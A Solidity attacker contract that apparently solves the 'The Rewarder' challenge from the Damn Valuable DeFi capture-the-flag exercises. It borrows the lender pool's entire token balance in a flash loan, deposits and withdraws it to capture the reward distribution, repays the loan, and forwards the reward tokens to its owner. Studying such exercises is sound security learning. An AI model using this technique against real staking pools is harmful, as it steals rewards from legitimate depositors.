// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./TheRewarderPool.sol";
import "../DamnValuableToken.sol";
import "./FlashLoanerPool.sol";
import "./RewardToken.sol";

contract TheRewarderAttacker {

  address immutable owner;

  TheRewarderPool immutable theRewarderPool;
  DamnValuableToken immutable damnValuableToken;
  FlashLoanerPool immutable flashLoanerPool;
  RewardToken immutable rewardToken;

  constructor(address _theRewarderPool, address _damnValuableToken, address _flashLoanerPool, address _rewardToken) {
    theRewarderPool = TheRewarderPool(_theRewarderPool);
    damnValuableToken = DamnValuableToken(_damnValuableToken);
    flashLoanerPool = FlashLoanerPool(_flashLoanerPool);
    rewardToken = RewardToken(_rewardToken);

    owner = msg.sender;
  }

  function attack() external {
    flashLoanerPool.flashLoan(damnValuableToken.balanceOf(address(flashLoanerPool)));
  }

  function receiveFlashLoan(uint256 _amount) external {
    damnValuableToken.approve(address(theRewarderPool), _amount);
    theRewarderPool.deposit(_amount);
    theRewarderPool.withdraw(_amount);
    damnValuableToken.transfer(address(flashLoanerPool), _amount);
    rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
  }
}